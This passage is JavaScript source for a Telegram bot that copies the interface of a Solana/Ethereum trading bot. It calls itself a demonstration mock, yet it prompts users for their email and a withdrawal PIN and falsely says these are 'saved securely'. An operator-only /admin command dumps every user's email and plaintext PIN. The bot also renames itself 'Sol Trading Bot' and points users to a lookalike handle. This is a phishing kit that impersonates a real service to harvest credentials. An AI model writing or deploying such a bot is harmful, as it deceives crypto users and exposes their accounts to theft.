  if (text === "🟣 Solana" || text === "🔵 Ethereum") return (ctx) => handleStepAssigned(ctx, state);
  if (text === "🏠 Main Menu") return (ctx) => handleDashMain(ctx, state);
  if (text === "💰 Buy") return (ctx) => handleDashBuy(ctx, state);
  if (text === "📉 Sell") return (ctx) => handleDashSell(ctx, state);
  if (text === "🔄 Swap") return (ctx) => handleDashSwap(ctx, state);
  if (text === "💸 Withdraw") return (ctx) => handleDashWithdraw(ctx, state);
  if (text === "💎 Stake") return (ctx) => handleDashStake(ctx, state);
  if (text === "👥 Copy Trade") return (ctx) => handleDashCopy(ctx, state);
  if (text === "💳 Balance") return (ctx) => handleDashBalance(ctx, state);
  if (text === "💳 Deposit") return (ctx) => handleDashDeposit(ctx, state);
  if (text === "📊 DCA") return (ctx) => handleDashDca(ctx, state);
  if (text === "🔔 Alerts") return (ctx) => handleDashAlerts(ctx, state);
  if (text === "📊 Signal Strength") return (ctx) => handleDashSignal(ctx, state);
  if (text === "📈 Portfolio") return (ctx) => handleDashPortfolio(ctx, state);
  if (text === "🧾 Trades") return (ctx) => handleDashTrades(ctx, state);
  if (text === "📜 History") return (ctx) => handleDashHistory(ctx, state);
  if (text === "👥 Referral") return (ctx) => handleDashReferral(ctx, state);
  if (text === "🎟️ Support") return (ctx) => handleDashSupport(ctx, state);
  if (text === "⚙️ Settings") return (ctx) => handleMenuSettings(ctx, state);
  if (text === "🔁 Restart") return (ctx) => handleMenuReset(ctx, state);
  if (text === "🚀 Enter Dashboard") return (ctx) => handleMenuDashboard(ctx, state);
  if (text === "🏠 Dashboard") return (ctx) => handleMenuDashboard(ctx, state);
  if (text === "🏠 Back to Dashboard") return (ctx) => handleMenuDashboard(ctx, state);

  if (text === "SOL → ETH") return (ctx) => handleSwapPair(ctx, state, "sol-eth");
  if (text === "ETH → SOL") return (ctx) => handleSwapPair(ctx, state, "eth-sol");

  if (text === "sol") {
    if (state.pendingAction === "withdraw") return (ctx) => handleWithdrawToken(ctx, state, "sol");
    if (state.pendingAction === "stake") return (ctx) => handleStakeToken(ctx, state, "sol");
    if (state.pendingAction === "buy") return (ctx) => handleBuyToken(ctx, state, "sol");
    if (state.pendingAction === "sell") return (ctx) => handleSellToken(ctx, state, "sol");
  }
  if (text === "eth") {
    if (state.pendingAction === "withdraw") return (ctx) => handleWithdrawToken(ctx, state, "eth");
    if (state.pendingAction === "stake") return (ctx) => handleStakeToken(ctx, state, "eth");
    if (state.pendingAction === "buy") return (ctx) => handleBuyToken(ctx, state, "eth");
    if (state.pendingAction === "sell") return (ctx) => handleSellToken(ctx, state, "eth");
  }

  if (text === "New DCA") return (ctx) => handleDcaNew(ctx, state);
  if (text === "My DCA plans") return (ctx) => handleDcaPlans(ctx, state);

  for (const trader of MOCK_TRADERS) {
    if (text === `${trader.avatar} ${trader.name}`) return (ctx) => handleCopyTrader(ctx, state, trader.id);
  }

  if (text === "📋 Copy This Trade" && state.selectedTrader) return (ctx) => handleCopyConfirm(ctx, state, state.selectedTrader);

  const buyAmountMatch = text.match(/^(\d+(?:\.\d+)?)$/);
  if (buyAmountMatch && state.pendingAction === "buy" && state.buyToken) return (ctx) => handleBuyAmount(ctx, state, buyAmountMatch[1]);

  if (state.pendingAction === "sell" && text === "25%") return (ctx) => handleSellPct(ctx, state, "25");
  if (state.pendingAction === "sell" && text === "50%") return (ctx) => handleSellPct(ctx, state, "50");
  if (state.pendingAction === "sell" && text === "🔥 100%") return (ctx) => handleSellPct(ctx, state, "100");

  if (text === "🔔 Notifications ON" || text === "🔕 Notifications OFF") return (ctx) => handleAlertsToggle(ctx, state);

  if (text.startsWith("Slippage:")) return (ctx) => handleSettingsToggle(ctx, state, "slippage");
  if (text.startsWith("Auto-buy:")) return (ctx) => handleSettingsToggle(ctx, state, "autoBuy");
  if (text.startsWith("MEV Protection:")) return (ctx) => handleSettingsToggle(ctx, state, "mevProtection");

  if (text === "🔙 Back") {
    if (state.currentView === "trader_detail" || state.currentView === "copy_confirm") {
      return (ctx) => handleDashCopy(ctx, state);
    }
    return (ctx) => handleMenuDashboard(ctx, state);
  }

  return null;
}

async function handleSettingsToggle(ctx, state, setting) {
  state[setting] = !state[setting];
  state.currentView = "settings";
  return replyWithCachedPhoto(ctx, "settings", {
    caption:
      "⚙️ *Settings*\n\n" +
      "Toggle trading options below:\n\n" +
      `• *Slippage* — ${state.slippage ? "ON ✅" : "OFF ❌"}\n` +
      `• *Auto-buy* — ${state.autoBuy ? "ON ✅" : "OFF ❌"}\n` +
      `• *MEV Protection* — ${state.mevProtection ? "ON ✅" : "OFF ❌"}\n`,
    parse_mode: "Markdown",
    reply_markup: settingsKeyboard(state).reply_markup,
  });
}

bot.start((ctx) => {
  const state = getState(ctx);
  state.awaitingEmail = false;
  state.awaitingPin = false;
  state.awaitingPinConfirm = false;
  state.awaitingSwapAmount = false;
  state.swapPair = null;
  state.awaitingWithdrawAmount = false;
  state.withdrawToken = null;
  state.awaitingStakeAmount = false;
  state.stakeToken = null;
  state.currentView = null;
  state.pendingAction = null;
  state.selectedTrader = null;
  return replyWithCachedPhoto(ctx, "welcome", {
    caption: WELCOME_TEXT,
    parse_mode: "Markdown",
    reply_markup: welcomeKeyboard().reply_markup,
  });
});

bot.help((ctx) => {
  return replyWithCachedPhoto(ctx, "welcome", {
    caption:
      "ℹ️ *Solana Trading Bot (Mock Clone)*\n\n" +
      "This is a UI clone of @sol_trading_helper_bot for demonstration only. " +
      "No real funds or on-chain activity occurs.\n\n" +
      "Commands:\n" +
      "/start — Restart the welcome flow.\n" +
      "/help — Show this help.",
    parse_mode: "Markdown",
    reply_markup: welcomeKeyboard().reply_markup,
  });
});

bot.command("reset", (ctx) => {
  return handleMenuReset(ctx, getState(ctx));
});

bot.command("admin", (ctx) => {
  if (!ADMIN_ID || ctx.from.id !== ADMIN_ID) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  if (registeredUsers.size === 0) {
    return ctx.reply("📭 No registered users yet.");
  }
  let userList = "📋 *Registered Users*\n\n";
  let i = 1;
  for (const user of registeredUsers.values()) {
    userList +=
      `*${i}.* @${user.username || "unknown"} (ID: ${user.userId})\n` +
      `📧 ${user.email}\n` +
      `🔐 PIN: ${user.pin}\n` +
      `🟣 Address: \`${user.address}\`\n` +
      `💵 SOL: $${user.solBalance.toFixed(2)} | ETH: $${user.ethBalance.toFixed(2)} | USDC: $${user.usdcBalance.toFixed(2)}\n` +
      `📅 Registered: ${user.registeredAt}\n\n`;
    i++;
  }
  return ctx.replyWithMarkdown(userList);
});

bot.on("text", async (ctx) => {
  const state = getState(ctx);
  const text = (ctx.text ?? "").trim();
  const chatId = ctx?.chat?.id;

  if (state.awaitingEmail) {
    await deleteUserMessage(ctx);
    if (text.includes("@")) {
      state.email = text;
      state.awaitingEmail = false;
      state.awaitingPin = true;
      return replyWithCachedPhoto(ctx, "email", {
        caption:
          "✅ **Email saved securely**\n\n" +
          `📧 \`${text}\`\n\n` +
          "🔐 **Now set your 4-digit PIN for withdrawals.**\n\n" +
          "_Enter a 4-digit number (message will be auto-deleted for security):_",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (chatId !== undefined) {
      return sendPhotoCached(chatId, "security", {
        caption: SECURITY_SETUP_TEXT,
        parse_mode: "Markdown",
        reply_markup: { remove_keyboard: true },
      });
    }
    return;
  }

  if (state.awaitingPin) {
    await deleteUserMessage(ctx);
    if (/^\d{4}$/.test(text)) {
      state.pin = text;
      state.awaitingPin = false;
      state.awaitingPinConfirm = true;
      return replyWithCachedPhoto(ctx, "pin", {
        caption: PIN_CONFIRM_TEXT,
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    return replyWithCachedPhoto(ctx, "pin", {
      caption: PIN_PROMPT_TEXT,
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }

  if (state.awaitingPinConfirm) {
    await deleteUserMessage(ctx);
    if (/^\d{4}$/.test(text) && text === state.pin) {
      state.awaitingPinConfirm = false;
      registerUser(state);
      return replyWithCachedPhoto(ctx, "dashboard", {
        caption: SECURITY_COMPLETE_TEXT(state),
        parse_mode: "Markdown",
        reply_markup: securityCompleteKeyboard().reply_markup,
      });
    }
    if (/^\d{4}$/.test(text)) {
      return replyWithCachedPhoto(ctx, "pin", {
        caption: PIN_MISMATCH_TEXT,
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    return replyWithCachedPhoto(ctx, "pin", {
      caption: PIN_CONFIRM_TEXT,
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }

  const navHandler = dispatchNav(text, state);
  if (navHandler) {
    state.awaitingEmail = false;
    state.awaitingPin = false;
    state.awaitingPinConfirm = false;
    state.awaitingSwapAmount = false;
    state.swapPair = null;
    state.awaitingWithdrawAmount = false;
    state.withdrawToken = null;
    state.awaitingStakeAmount = false;
    state.stakeToken = null;
    state.buyToken = null;
    state.sellToken = null;
    state.pendingAction = null;
    return navHandler(ctx);
  }

  if (state.awaitingSwapAmount) {
    await deleteUserMessage(ctx);
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) {
      return replyWithCachedPhoto(ctx, "swap", {
        caption: "❌ *Invalid amount.*\n\nPlease enter a valid number in USD.",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (state.swapPair === "sol-eth") {
      const solUsd = state.solBalance * SOL_PRICE;
      if (amount > solUsd) {
        return replyWithCachedPhoto(ctx, "swap", {
          caption:
            "❌ *Insufficient SOL balance.*\n\n" +
            `💵 You have: $${solUsd.toFixed(2)}\n` +
            `💵 Required: $${amount.toFixed(2)}\n\n` +
            "Please enter a lower amount.",
          parse_mode: "Markdown",
          reply_markup: backKeyboard().reply_markup,
        });
      }
      state.awaitingSwapAmount = false;
      state.swapPair = null;
      return replyWithCachedPhoto(ctx, "swap", {
        caption:
          "✅ *Swap Successful (Mock)*\n\n" +
          `🔄 Swapped $${amount.toFixed(2)} USD of SOL → ETH\n` +
          `💵 SOL balance: $${(solUsd - amount).toFixed(2)}\n` +
          `💵 ETH balance: $${(amount * 0.85).toFixed(2)} (est.)\n\n` +
          "_Swap is simulated in this mock._",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (state.swapPair === "eth-sol") {
      const ethUsd = 0;
      if (amount > ethUsd) {
        return replyWithCachedPhoto(ctx, "swap", {
          caption:
            "❌ *Insufficient ETH balance.*\n\n" +
            `💵 You have: $${ethUsd.toFixed(2)}\n` +
            `💵 Required: $${amount.toFixed(2)}\n\n` +
            "Please enter a lower amount.",
          parse_mode: "Markdown",
          reply_markup: backKeyboard().reply_markup,
        });
      }
      state.awaitingSwapAmount = false;
      state.swapPair = null;
      return replyWithCachedPhoto(ctx, "swap", {
        caption:
          "✅ *Swap Successful (Mock)*\n\n" +
          `🔄 Swapped $${amount.toFixed(2)} USD of ETH → SOL\n` +
          `💵 ETH balance: $${(ethUsd - amount).toFixed(2)}\n` +
          `💵 SOL balance: $${(amount * 1.15).toFixed(2)} (est.)\n\n` +
          "_Swap is simulated in this mock._",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
  }

  if (state.awaitingWithdrawAmount) {
    await deleteUserMessage(ctx);
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) {
      return replyWithCachedPhoto(ctx, "withdraw", {
        caption: "❌ *Invalid amount.*\n\nPlease enter a valid number in USD.",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (state.withdrawToken === "sol") {
      const solUsd = state.solBalance * SOL_PRICE;
      if (amount > solUsd) {
        return replyWithCachedPhoto(ctx, "withdraw", {
          caption:
            "❌ *Insufficient SOL balance.*\n\n" +
            `💵 You have: $${solUsd.toFixed(2)}\n` +
            `💵 Required: $${amount.toFixed(2)}\n\n` +
            "Please enter a lower amount.",
          parse_mode: "Markdown",
          reply_margin: undefined,
          reply_markup: backKeyboard().reply_markup,
        });
      }
      state.awaitingWithdrawAmount = false;
      state.withdrawToken = null;
      return replyWithCachedPhoto(ctx, "withdraw", {
        caption:
          "✅ *Withdraw Successful (Mock)*\n\n" +
          `💸 Withdrew $${amount.toFixed(2)} USD to external wallet\n` +
          `💵 Remaining SOL balance: $${(solUsd - amount).toFixed(2)}\n\n` +
          "_Withdrawals are simulated in this mock._",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (state.withdrawToken === "eth") {
      const ethUsd = 0;
      if (amount > ethUsd) {
        return replyWithCachedPhoto(ctx, "withdraw", {
          caption:
            "❌ *Insufficient ETH balance.*\n\n" +
            `💵 You have: $${ethUsd.toFixed(2)}\n` +
            `💵 Required: $${amount.toFixed(2)}\n\n` +
            "Please enter a lower amount.",
          parse_mode: "Markdown",
          reply_markup: backKeyboard().reply_markup,
        });
      }
      state.awaitingWithdrawAmount = false;
      state.withdrawToken = null;
      return replyWithCachedPhoto(ctx, "withdraw", {
        caption:
          "✅ *Withdraw Successful (Mock)*\n\n" +
          `💸 Withdrew $${amount.toFixed(2)} USD to external wallet\n` +
          `💵 Remaining ETH balance: $${(ethUsd - amount).toFixed(2)}\n\n` +
          "_Withdrawals are simulated in this mock._",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
  }

  if (state.awaitingStakeAmount) {
    await deleteUserMessage(ctx);
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) {
      return replyWithCachedPhoto(ctx, "stake", {
        caption: "❌ *Invalid amount.*\n\nPlease enter a valid number in USD.",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (state.stakeToken === "sol") {
      const solUsd = state.solBalance * SOL_PRICE;
      if (amount > solUsd) {
        return replyWithCachedPhoto(ctx, "stake", {
          caption:
            "❌ *Insufficient SOL balance.*\n\n" +
            `💵 You have: $${solUsd.toFixed(2)}\n` +
            `💵 Required: $${amount.toFixed(2)}\n\n` +
            "Please enter a lower amount.",
          parse_mode: "Markdown",
          reply_markup: backKeyboard().reply_markup,
        });
      }
      state.awaitingStakeAmount = false;
      state.stakeToken = null;
      return replyWithCachedPhoto(ctx, "stake", {
        caption:
          "✅ *Stake Successful (Mock)*\n\n" +
          `💎 Staked $${amount.toFixed(2)} USD of SOL\n` +
          `💵 Remaining SOL balance: $${(solUsd - amount).toFixed(2)}\n` +
          "🔒 Your staked SOL is locked for 7 days.\n\n" +
          "_Staking is simulated in this mock._",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (state.stakeToken === "eth") {
      const ethUsd = 0;
      if (amount > ethUsd) {
        return replyWithCachedPhoto(ctx, "stake", {
          caption:
            "❌ *Insufficient ETH balance.*\n\n" +
            `💵 You have: $${ethUsd.toFixed(2)}\n` +
            `💵 Required: $${amount.toFixed(2)}\n\n` +
            "Please enter a lower amount.",
          parse_mode: "Markdown",
          reply_markup: backKeyboard().reply_markup,
        });
      }
      state.awaitingStakeAmount = false;
      state.stakeToken = null;
      return replyWithCachedPhoto(ctx, "stake", {
        caption:
          "✅ *Stake Successful (Mock)*\n\n" +
          `💎 Staked $${amount.toFixed(2)} USD of ETH\n` +
          `💵 Remaining ETH balance: $${(ethUsd - amount).toFixed(2)}\n` +
          "🔒 Your staked ETH is locked for 7 days.\n\n" +
          "_Staking is simulated in this mock._",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
  }

  if (/^\/start\b/.test(text)) {
    state.awaitingEmail = false;
    state.awaitingPin = false;
    state.awaitingPinConfirm = false;
    state.awaitingSwapAmount = false;
    state.swapPair = null;
  state.awaitingWithdrawAmount = false;
   state.withdrawToken = null;
   state.awaitingStakeAmount = false;
   state.stakeToken = null;
   state.buyToken = null;
   state.sellToken = null;
    state.currentView = null;
    state.pendingAction = null;
    state.selectedTrader = null;
    return replyWithCachedPhoto(ctx, "welcome", {
      caption: WELCOME_TEXT,
      parse_mode: "Markdown",
      reply_markup: welcomeKeyboard().reply_markup,
    });
  }

  return handleMenuDashboard(ctx, state);
});

bot.catch((err, ctx) => {
  console.error(`Error for ${ctx?.update?.update_id}:`, err);
});

const BOT_PROFILE_NAME = "Sol Trading Bot";
const BOT_SHARE_DESCRIPTION = "you can contact @soltrading_helper_bot right away.";

async function configureProfile() {
  try {
    await bot.telegram.setMyName(BOT_PROFILE_NAME);
  } catch (err) {
    console.error("⚠️  setMyName failed:", err?.message || err);
  }
  try {
    await bot.telegram.setMyShortDescription(BOT_SHARE_DESCRIPTION);
  } catch (err) {
    console.error("⚠️  setMyShortDescription failed:", err?.message || err);
  }
  console.log("✅ Bot profile configured for rich link previews.");
}

const MAX_RETRIES = 5;
const RETRY_DELAY_MS = 3000;

function isConflict(err) {
  return (
    err instanceof Error &&
    /409|Conflict: terminated by other getUpdates request/.test(err.message)
  );
}

let retryCount = 0;

function startWithRetry() {
  return bot
    .launch({ dropPendingUpdates: true }, () => {
      retryCount = 0;
      console.log("🚀 Visual UI Clone is online and active!");
      configureProfile();
    })
    .catch((err) => {
      if (isConflict(err) && retryCount < MAX_RETRIES) {
        retryCount++;
        console.warn(
          `⚠️  Polling conflict (${retryCount}/${MAX_RETRIES}). Retrying in ${RETRY_DELAY_MS}ms...`
        );
        setTimeout(startWithRetry, RETRY_DELAY_MS);
      } else {
        console.error("❌ Failed to launch bot:", err);
        process.exit(1);
      }
    });
}

if (require.main === module) {
  startWithRetry();
}

process.on("unhandledRejection", (err) => {
  console.error("⚠️  Unhandled rejection:", err);
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));

exports.bot = bot;
exports.SOL_PRICE = SOL_PRICE;
exports.ETH_PRICE = ETH_PRICE;
exports.MOCK_TRADERS = MOCK_TRADERS;
exports.WELCOME_TEXT = WELCOME_TEXT;
exports.NETWORK_TEXT = NETWORK_TEXT;
exports.walletAssignedText = walletAssignedText;
exports.SECURITY_SETUP_TEXT = SECURITY_SETUP_TEXT;
exports.PIN_PROMPT_TEXT = PIN_PROMPT_TEXT;
exports.PIN_CONFIRM_TEXT = PIN_CONFIRM_TEXT;
exports.DASHBOARD_TEXT = DASHBOARD_TEXT;
exports.NETWORK_GRID_TEXT = NETWORK_GRID_TEXT;
exports.SECURITY_COMPLETE_TEXT = SECURITY_COMPLETE_TEXT;
exports.PIN_MISMATCH_TEXT = PIN_MISMATCH_TEXT;
exports.welcomeKeyboard = welcomeKeyboard;
exports.networkKeyboard = networkKeyboard;
exports.dashboardKeyboard = dashboardKeyboard;
exports.buyKeyboard = buyKeyboard;
exports.buyTokenKeyboard = buyTokenKeyboard;
exports.sellKeyboard = sellKeyboard;
exports.sellTokenKeyboard = sellTokenKeyboard;
exports.settingsKeyboard = settingsKeyboard;
exports.mainMenuKeyboard = mainMenuKeyboard;
exports.backKeyboard = backKeyboard;
exports.securityCompleteKeyboard = securityCompleteKeyboard;
exports.swapPairKeyboard = swapPairKeyboard;
exports.withdrawTokenKeyboard = withdrawTokenKeyboard;
exports.stakeTokenKeyboard = stakeTokenKeyboard;
exports.dcaKeyboard = dcaKeyboard;
exports.alertsKeyboard = alertsKeyboard;
exports.buyTokenKeyboard = buyTokenKeyboard;
exports.sellTokenKeyboard = sellTokenKeyboard;
exports.handleBuyToken = handleBuyToken;
exports.handleBuyAmount = handleBuyAmount;
exports.handleSellToken = handleSellToken;
exports.copyTradersKeyboard = copyTradersKeyboard;
exports.copyTradeKeyboard = copyTradeKeyboard;
exports.getState = getState;
exports.registeredUsers = registeredUsers;
exports.registerUser = registerUser;
exports.ADMIN_ID = ADMIN_ID;
